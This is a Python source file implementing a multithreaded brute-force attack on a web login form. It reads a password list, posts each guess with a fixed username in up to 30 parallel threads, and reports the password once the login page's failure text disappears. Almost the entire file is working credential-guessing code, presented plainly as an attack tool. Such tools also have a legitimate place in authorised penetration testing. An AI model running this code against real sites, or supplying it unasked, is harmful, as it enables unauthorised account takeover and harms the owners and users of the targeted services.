import threading
import time
from important_static_functions import *


class BruteForce:
    threads = []

    def __init__(self, url, username, passwords_list, username_field, password_field, submit_field_name,
                 verification, verbose=None, threads=30):
        self.start = time.time()
        self.creds_found = False
        self.threads_num = threads
        self.url = url
        self.username = username
        self.passwords_list = passwords_list
        self.username_field = username_field
        self.passwords_list = passwords_list
        self.password_field = password_field
        self.submit_field_name = submit_field_name
        self.verification = verification
        self.verbose = verbose
        self.end = time.time()
        self._stop_event = threading.Event()

    def proper_response(self, data, word, number):
        if self.creds_found:
            return
        response = brute_force_request(self.url, data=data, timeout=5)
        if self.verification in response.content.decode('utf-8'):
            print(colored(f'\r[-] Working On {number}\t\tPassword Invalid "{word}"\n', 'red'), end='')
            pass
        else:
            self.creds_found = True
            print(colored(f'[+] Working On {number}\t\tPassword Found "{word}"', 'green'))
            self.end = time.time()
            print(f"[*] Total time - {self.end - self.start} seconds.")

    def brute_force(self):
        connection_check(self.url)
        number = 1
        words = read(self.passwords_list)
        for word in words:
            if self.creds_found:
                self.exit()
            word = clean_word(word)
            data = {
                self.username_field: self.username,
                self.password_field: word,
                self.submit_field_name: 'submit'
            }
            thread = threading.Thread(target=self.proper_response, args=(data, word, number))
            self.threads.append(thread)
            while threading.activeCount() > self.threads_num + 1:
                continue
            thread.start()
            number += 1
        self.exit()

    def collection_of_threads(self):
        for thread in self.threads:
            try:
                thread.join()
            except RuntimeError:
                pass

    def exit(self):
        if not self.creds_found:
            print("\n[*] - Approaching final keyspace...")

        self.collection_of_threads()

        if not self.creds_found:
            print(f"[-] - Failed to find valid credentials for {self.url}")
            self.end = time.time()
            print(f"[*] Total time - {self.end - self.start} seconds.")
        sys.exit()
